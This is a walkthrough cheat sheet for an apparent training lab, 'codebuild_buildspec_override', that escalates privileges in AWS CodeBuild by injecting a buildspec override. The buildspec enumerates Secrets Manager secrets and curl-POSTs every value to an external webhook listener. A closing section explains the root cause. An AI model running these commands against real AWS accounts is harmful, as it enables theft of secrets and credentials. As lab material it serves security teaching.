# Cheat Sheet - codebuild_buildspec_override

## Setup

```bash
# Configure the starting profile using the credentials from start.txt
aws configure --profile bob
# Enter the access key ID, secret access key, and your preferred region (e.g. us-east-1)
```

---

## Step 1 — Enumerate CodeBuild Projects

```bash
aws codebuild list-projects --profile bob
```

Note the project name — it will look like `cg-vulnerable-project-<cgid>`.

---

## Step 2 — Inspect the Project

```bash
aws codebuild batch-get-projects \
  --names cg-vulnerable-project-<cgid> \
  --profile bob
```

This step is optional. The project's configuration has no reference to Secrets Manager anywhere, `environment.environmentVariables` will be absent or empty. The only thing worth noting is the service role ARN, confirming the project runs under a privileged identity.

---

## Step 3 — Set Up a Listener

On your attacker machine, start a simple HTTP listener to receive the exfiltrated secret value:

```bash
# Use a public endpoint service such as https://webhook.site
# Copy the unique URL it gives you
```

Make note of your listener URL, the webhook.site URL.

---

## Step 4 — Inject Inline Buildspec and Start the Build

Replace `<cgid>` and `<listener-url>` with your values. Either option below achieves the same result. Neither needs a secret name or ID up front, the injected buildspec discovers it itself by enumerating secrets with `list-secrets`.

### Option A — Buildspec File

Write the buildspec override to a local file:

```bash
cat > /tmp/buildspec_override.yml << 'EOF'

version: 0.2
phases:
  build:
    commands:
      - |
        for NAME in $(aws secretsmanager list-secrets --query "SecretList[].Name" --output text); do
          VALUE=$(aws secretsmanager get-secret-value --secret-id "$NAME" --query "SecretString" --output text)
          curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"
        done
EOF
```

Then start the build, pointing `--buildspec-override` at the file:

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-<cgid> \
  --buildspec-override file:///tmp/buildspec_override.yml \
  --profile bob \
  --region us-east-1
```

### Option B — Direct Command

A single command with no intermediate file, using an ANSI-C quoted string so the newlines are passed as `\n` instead of typed literally:

```bash
aws codebuild start-build \
  --project-name cg-vulnerable-project-<cgid> \
  --buildspec-override $'version: 0.2\nphases:\n  build:\n    commands:\n      - |\n        for NAME in $(aws secretsmanager list-secrets --query "SecretList[].Name" --output text); do\n          VALUE=$(aws secretsmanager get-secret-value --secret-id "$NAME" --query "SecretString" --output text)\n          curl -s -X POST "<listener-url>" -H "Content-Type: application/json" -d "$VALUE"\n        done'\
  --profile bob \
  --region us-east-1
```


Note the `id` returned in the response, you can use it to track the build.

---

## Step 5 — Monitor the Build (Optional)

```bash
aws codebuild batch-get-builds \
  --ids <build-id> \
  --profile bob
```

Wait until `buildStatus` changes from `IN_PROGRESS` to `SUCCEEDED`.

---

## Step 6 — Collect the Secret Value

Check your listener. The secret value (the flag) will arrive as a POST body within a few seconds of the build reaching the `build` phase.

Example output at listener:
```
{"flag":"Congratulations, you successfully injected the commands and escalated the privileges"}
```

**Scenario complete.**

---

## Key Vulnerability

`codebuild:BatchGetProjects` discloses nothing about the target secret here, the project's configuration carries no reference to it at all. `codebuild:StartBuild` accepts a `buildspecOverride` parameter that completely replaces the project's configured buildspec at runtime, giving the caller arbitrary command execution under the CodeBuild service role. That role holds `secretsmanager:ListSecrets`, an action that takes no secret identifier as input and so cannot be scoped to a single resource ARN, and `secretsmanager:GetSecretValue` scoped to the one target secret. The injected commands call `ListSecrets` to enumerate secrets in the account, then loop `GetSecretValue` over the results, so an identity holding nothing more than `ListProjects`, `BatchGetProjects`, and `StartBuild` can exfiltrate the secret without ever holding Secrets Manager permissions itself, and without any advance knowledge of the secret's name. Scoping `GetSecretValue` down to a single secret ARN does not prevent this: the vulnerability is the buildspec override giving arbitrary command execution as that role, not the breadth of what the role can reach.